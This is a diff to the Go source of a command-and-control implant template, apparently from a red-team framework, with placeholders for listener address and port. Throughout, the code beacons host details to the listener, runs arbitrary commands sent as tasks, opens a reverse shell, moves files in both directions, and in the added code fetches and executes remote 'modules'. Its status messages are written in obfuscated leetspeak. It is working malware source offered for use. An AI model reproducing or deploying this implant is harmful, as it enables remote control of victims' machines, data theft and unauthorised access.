@@ -1,7 +1,6 @@
 package main
 
 import (
-	"runtime"
 	"bufio"
 	"bytes"
 	"encoding/base64"
@@ -12,36 +11,46 @@ import (
 	"net"
 	"net/http"
 	"os"
-	"os/user"
 	"os/exec"
+	"os/user"
+	"runtime"
+	"strconv"
 	"strings"
 	"time"
 )
 
+const (
+	STAGER            string = "{{stager.id}}"
+	LISTENER_IP              = "{{stager.listener.address}}"
+	LISTENER_PORT     string = "{{stager.listener.port}}"
+	URL                      = "http://" + LISTENER_IP + ":" + LISTENER_PORT
+	string_sleep_time string = "{{stager.options['sleep-time']}}"
+	string_delay      string = "{{stager.delay}}"
+) // constants defined by the stager
+var (
+	name           = ""
+	output  string = ""
+	success bool   = false
+)
+
 type Task struct {
-	ID          int                    `json:"id"`
-	Name        string                 `json:"name"`
-	Description string                 `json:"description"`
-	Action      string                 `json:"action"`
-	Args        map[string]interface{} `json:"args"`
-	Output      interface{}            `json:"output"`
-	Success     interface{}            `json:"success"`
-	CreatedAt   string                 `json:"created_at"`
-	FinishedAt  string                 `json:"finished_at"`
-	Device      int                    `json:"device"`
+	ID      int                    `json:"id"`
+	Name    string                 `json:"name"`
+	Action  string                 `json:"action"`
+	Args    map[string]interface{} `json:"args"`
+	Output  interface{}            `json:"output"`
+	Success bool                   `json:"success"`
 }
-var name = ""
-var STAGER int = {{stager.id}}
-var LISTENER_IP = "{{stager.listener.address}}"
-var LISTENER_PORT = "{{stager.listener.port}}"
-var URL = "http://" + LISTENER_IP + ":" + LISTENER_PORT
-var sleep_time int = {{stager.options["sleep-time"]}}
-var delay int = {{stager.delay}}
-var output = ""
-var success = false
 
+type Module struct {
+	Name              string   `json:"name"`
+	Admin             bool     `json:"admin"`
+	Language          string   `json:"language"`
+	Code_type         string   `json:"code_type"`
+	Execution_methods []string `json:"execution_methods"`
+}
 
-func system_info() []byte{
+func system_info() []byte {
 	// get system info
 	hostname, err := os.Hostname()
 
@@ -57,20 +66,20 @@ func system_info() []byte{
 		username = user.Username
 	}
 	// Get the IP address of the current machine
-    address := ""
+	address := ""
 
-    conn, err := net.Dial("udp", "8.8.8.8:80")
-    if err != nil {
+	conn, err := net.Dial("udp", "8.8.8.8:80")
+	if err != nil {
 		address = "unknown"
-    } else {
-    	defer conn.Close()
+	} else {
+		defer conn.Close()
 		address = conn.LocalAddr().(*net.UDPAddr).IP.String()
 	}
 
 	data, err := json.Marshal(map[string]any{
 		"address":      address,
 		"hostname":     hostname,
-		"os": 		    runtime.GOOS,
+		"os":           runtime.GOOS,
 		"architecture": runtime.GOARCH,
 		"username":     username,
 		"admin":        false,
@@ -81,46 +90,109 @@ func system_info() []byte{
 
 }
 
-func run_command(command string){
-	cmd := exec.Command(command)
+// Run a command and return the output and success
+func run_command(command string) (output string, success bool) {
+	parts := strings.Fields(command)
+	executable := parts[0]
+	args := parts[1:]
+	cmd := exec.Command(executable, args...)
 	stdout, err := cmd.Output()
 	output, success = string(stdout), err == nil
+	// has to return the output and success because its called by modules too
+	return
 }
 
-func reverse_shell(address string, port string){
+// Execute a module using a task
+func execute_module(
+	task Task,
+) (output string, success bool) {
+
+	// Get the module
+	resp, err := http.Get(URL + "/module/" + task.Name)
+
+	if err != nil || resp.StatusCode != http.StatusOK {
+		output, success = "Could not download module.", false
+		return
+	}
+
+	defer resp.Body.Close()
+
+	// Read the module
+	module_body, err := ioutil.ReadAll(resp.Body)
+
+	if err != nil {
+		output, success = "Could not read module.", false
+		return
+	}
+
+	// Unmarshal the module
+	var module Module
+	err = json.Unmarshal(module_body, &module)
+
+	if err != nil {
+		output, success = "Could not parse module.", false
+		return
+	}
+
+	// Get the module code
+	resp, err = http.Get(URL + "/module/download/" + task.Name)
+
+	if err != nil || resp.StatusCode != http.StatusOK {
+		output, success = "Could not download module code.", false
+		return
+	}
+
+	defer resp.Body.Close()
+
+	// Read the module code
+	module_code, err := ioutil.ReadAll(resp.Body)
+
+	if err != nil {
+		output, success = "Could not read module code.", false
+		return
+	}
+	// Execute the module
+
+	if task.Args["execution_method"] == "command" {
+		output, success = run_command(string(module_code))
+	} else {
+		output, success = "Unsupported execution method.", false
+	}
+	return
+}
+
+func reverse_shell(address string, port string) {
 	conn, err := net.Dial("tcp", address+":"+port)
 
 	if err != nil {
 		return
 	}
 	for {
- 
-	   message, err := bufio.NewReader(conn).ReadString('\n')
-	   
-	   if err != nil {
-		  return
-	   }
 
+		message, err := bufio.NewReader(conn).ReadString('\n')
 
-	   // split the message into command and arguments
-	   parts := strings.Fields(message)
-	   cmd := parts[0]
-	   args := parts[1:]
+		if err != nil {
+			return
+		}
 
-	   // run the command
-	   out, err := exec.Command(cmd, args...).Output()
- 
-	   if err != nil {
-		  fmt.Fprintf(conn, "%s\n",err)
-	   }
- 
-	   fmt.Fprintf(conn, "%s\n",out)
- 
+		// split the message into command and arguments
+		parts := strings.Fields(message)
+		cmd := parts[0]
+		args := parts[1:]
+
+		// run the command
+		out, err := exec.Command(cmd, args...).Output()
+
+		if err != nil {
+			fmt.Fprintf(conn, "%s\n", err)
+		}
+
+		fmt.Fprintf(conn, "%s\n", out)
+
 	}
 }
 
-
-func download_file(task_name string, path string){
+func download_file(task_name string, path string) {
 	// Get the file from the server
 	resp, err := http.Get(URL + "/download/" + task_name)
 
@@ -135,7 +207,7 @@ func download_file(task_name string, path string){
 	file, err := os.Create(path)
 
 	defer file.Close()
-	
+
 	if err != nil {
 		output, success = "Could not create file.", false
 		return
@@ -180,20 +252,22 @@ func upload_file(file_name string) {
 }
 
 func main() {
-	time.Sleep({{ stager.delay }} * time.Second)
+	delay, _ := strconv.Atoi(string_delay)
+	sleep_time, _ := strconv.Atoi(string_sleep_time)
+	time.Sleep(time.Duration(delay) * time.Second)
 	// Set up the HTTP client
 	client := &http.Client{}
-	
+
 	data := system_info()
 
 	fmt.Println("Connecting to the L15t3n€r...")
 	resp, err := client.Post(URL+"/connect", "application/json", bytes.NewBuffer(data))
 
 	if err != nil {
-		fmt.Println("Could not connect to the listener.")
+		fmt.Println("Could not connect to the l15t3n€r.")
 		os.Exit(1)
 	} else {
-		fmt.Println("Connected to the listener.")
+		fmt.Println("C0nn3ct3d.")
 	}
 
 	var result map[string]interface{}
@@ -227,10 +301,9 @@ func main() {
 		}
 
 		for _, task := range tasks {
-
 			switch task.Action {
 			case "rce":
-				run_command(task.Args["cmd"].(string))
+				output, success = run_command(task.Args["cmd"].(string))
 			case "dir":
 				run_command("ls " + task.Args["dir"].(string))
 			case "reverse-shell":
@@ -240,11 +313,13 @@ func main() {
 				upload_file(task.Args["target_path"].(string))
 			case "upload":
 				download_file(task.Name, task.Args["target_path"].(string))
+			case "module":
+				output, success = execute_module(task)
 			default:
-				output, success = "Invalid action.", false
+				output, success = "Task not supported.", false
 			}
 			fmt.Println("Task: ", task.ID, "Output: ", output, "Success: ", success)
-			
+
 			data, err := json.Marshal(map[string]any{
 				"task":    task.ID,
 				"output":  output,
@@ -259,4 +334,3 @@ func main() {
 		}
 	}
 }
-
